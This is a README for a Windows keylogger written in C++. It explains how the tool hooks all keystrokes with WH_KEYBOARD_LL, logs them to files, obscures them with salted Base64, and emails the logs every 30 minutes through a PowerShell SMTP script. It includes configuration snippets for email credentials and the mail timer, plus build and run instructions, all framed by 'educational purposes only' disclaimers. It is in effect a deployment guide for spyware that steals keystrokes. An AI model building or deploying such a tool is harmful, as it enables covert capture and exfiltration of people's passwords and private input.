# KeyLogger

A robust and lightweight keylogging application designed for monitoring and logging keystrokes on Windows systems. This project is intended for **educational purposes only** and should be used responsibly and ethically, with explicit consent from all parties involved.

## Table of Contents

- Overview
- Features
- Architecture
- Installation
- Usage
- Configuration
- Security and Encryption
- Dependencies
- Building the Project
- Contributing
- Ethical Use Disclaimer
- License

## Overview

KeyLogger is a C++-based application that captures and logs keyboard input on Windows systems. It uses low-level keyboard hooks to monitor keystrokes, supports asynchronous operation for efficient performance, and includes features like periodic email reporting of logs and basic encryption for secure data handling. The application is modular, with separate components for keylogging, logging, email sending, and utility functions.

**Note**: This software is developed for educational and research purposes. Unauthorized use of keyloggers to monitor systems without consent is illegal and unethical. Always ensure compliance with local laws and obtain explicit permission before deploying this software.

## Features

- **Low-Level Keyboard Hooking**: Utilizes Windows API (`WH_KEYBOARD_LL`) to capture all keystrokes, including system keys (e.g., Shift, Ctrl, Alt).
- **Asynchronous Operation**: Leverages a custom `Timer` class for non-blocking execution, ensuring minimal system impact.
- **Periodic Email Reporting**: Sends log files to a configured email address at regular intervals using a PowerShell script for SMTP communication.
- **Base64 Encoding**: Implements a custom Base64 encoding scheme with salting for basic data obfuscation.
- **Log Management**: Stores logs with timestamps in a structured format, with support for appending and clearing logs after successful email transmission.
- **Configurable Settings**: Allows customization of email credentials, log intervals, and repeat counts for flexible operation.
- **Error Logging**: Maintains an application log (`AppLog.txt`) for debugging and tracking operational issues.
- **Cross-Platform Considerations**: While Windows-specific, the codebase is modular and can be adapted for other platforms with modifications.

## Architecture

The KeyLogger project is organized into several modular components, each responsible for a specific functionality:

- **KeybHook.h**: Manages low-level keyboard hooks to capture and process keystrokes, storing them in a global log buffer.
- **Timer.h**: Implements a timer class for asynchronous task scheduling, used for periodic email sending and other timed operations.
- **SendMail.h**: Handles email transmission of log files via a PowerShell script that interacts with an SMTP server (e.g., Gmail).
- **Base64.h**: Provides Base64 encoding with custom salting for basic data obfuscation.
- **Helper.h**: Contains utility functions for date/time formatting, string conversion, and application logging.
- **IO.h**: Manages file and directory operations, such as creating directories and writing log files (not fully provided but referenced).
- **KeyConstants.h**: Defines key mappings for virtual key codes to their string representations (not fully provided but referenced).
- **main.cpp**: Entry point for the application, currently minimal but can be extended to initialize the keylogger.

### Workflow

1. **Initialization**: The application installs a keyboard hook (`InstallHook`) and starts a timer (`MailTimer`) for periodic tasks.
2. **Keystroke Capture**: The `OurKeyboardProc` callback processes keyboard events, appending key names to a global `KeyLog` buffer.
3. **Logging**: Keystrokes are periodically written to a file using `IO::WriteLog`.
4. **Email Reporting**: The `TimerSendMail` function triggers email sending via `Mail::SendMail`, attaching the log file and clearing the buffer on success.
5. **Error Handling**: Errors during file creation, email sending, or other operations are logged to `AppLog.txt`.

## Installation

### Prerequisites

- **Operating System**: Windows 7 or later.
- **Compiler**: A C++ compiler supporting C++11 or later (e.g., MSVC, MinGW).
- **Libraries**: Windows SDK for Windows API functions.
- **PowerShell**: Required for email sending functionality (included with Windows).
- **SMTP Server Access**: A valid email account (e.g., Gmail) with SMTP enabled and an app-specific password for secure access.

### Steps

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/your-repo/keylogger.git
   cd keylogger
   ```

2. **Install Dependencies**: Ensure the Windows SDK is installed. For MinGW, install it via:

   ```bash
   pacman -S mingw-w64-x86_64-toolchain
   ```

3. **Configure Email Settings**: Edit `SendMail.h` to update the following constants with your email credentials:

   ```cpp
   #define X_EM_TO "recipient@example.com"
   #define X_EM_FROM "sender@example.com"
   #define X_EM_PASS "your-app-specific-password"
   ```

   **Note**: For Gmail, generate an app-specific password from your Google Account settings.

4. **Build the Project**: See Building the Project for detailed instructions.

5. **Run the Application**: Execute the compiled binary. The keylogger will start capturing keystrokes and sending logs based on the configured interval.

## Usage

1. **Start the KeyLogger**: Run the compiled executable. The application will install the keyboard hook and start the timer for email reporting.

2. **Monitor Logs**:

   - Keystrokes are stored in `KeyLog` and periodically written to files in the application’s directory.
   - Application logs are saved in `AppLog.txt` for debugging.

3. **Receive Emails**: Log files are sent to the configured email address at intervals defined by `MailTimer` (default: every 30 minutes).

4. **Stop the KeyLogger**: Call `UninstallHook` to remove the keyboard hook and stop the timer. This requires modifying `main.cpp` to include a shutdown mechanism (e.g., a key combination).

### Example

```cpp
#include "KeybHook.h"

int main() {
    if (!InstallHook()) {
        std::cout << "Failed to install hook!" << std::endl;
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UninstallHook();
    return 0;
}
```

## Configuration

- **Email Interval**: Modify the interval in `KeybHook.h`:

  ```cpp
  Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // 500 * 60 = 30 minutes
  ```
- **Log Directory**: Controlled by `IO::GetOurPath` (not provided but assumed to return a user-specific directory).
- **Encryption Salts**: Update salts in `Base64.h` for custom obfuscation:

  ```cpp
  const std::string &SALT1 = "LM::TB::BB";
  const std::string &SALT2 = "_:_77";
  const std::string &SALT3 = "line=wowC++";
  ```

## Security and Encryption

- **Base64 Encoding**: The application uses Base64 encoding with custom salts (`SALT1`, `SALT2`, `SALT3`) for basic data obfuscation. Note that Base64 is **not encryption** but an encoding scheme, as mentioned in `notes.txt`. For production use, consider implementing proper encryption (e.g., AES).
- **Email Security**: Uses SSL/TLS for SMTP communication (port 587). Ensure the email account uses an app-specific password to avoid exposing your primary password.
- **Log Storage**: Logs are stored in plain text. For enhanced security, encrypt log files before storage or transmission.

## Dependencies

- **C++ Standard Library**: `<iostream>`, `<fstream>`, `<vector>`, `<string>`, `<thread>`, `<chrono>`.
- **Windows API**: `<windows.h>` for keyboard hooks and shell execution.
- **PowerShell**: For email sending via `sm.ps1`.
- **External Libraries**: None required beyond the Windows SDK.

## Building the Project

### Using Code::Blocks

1. Open `KeyLogger.cbp` in Code::Blocks.
2. Ensure the compiler is set to a compatible version (e.g., MinGW GCC).
3. Build the project (`Build > Build`).
4. The executable will be generated in the `bin` directory.

### Using Command Line (MinGW)

```bash
g++ -o keylogger main.cpp -luser32 -lkernel32 -std=c++11
```

### Using Visual Studio

1. Create a new C++ project.
2. Add all `.cpp` and `.h` files to the project.
3. Configure the project to use the Windows SDK.
4. Build the solution.

## Contributing

Contributions are encouraged to improve functionality, security, or documentation. To contribute:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your-feature`).
3. Commit your changes (`git commit -m "Add your feature"`).
4. Push to the branch (`git push origin feature/your-feature`).
5. Open a pull request.

Please include tests and documentation for new features.

## Ethical Use Disclaimer

This software is provided for **educational and research purposes only**. Unauthorized use of keyloggers to monitor or intercept data without explicit consent is illegal and unethical. The developer is not responsible for any misuse or damage caused by this software. Always comply with applicable laws and respect user privacy.

---

*For feedback or inquiries, please open an issue on GitHub or contact the maintainer.*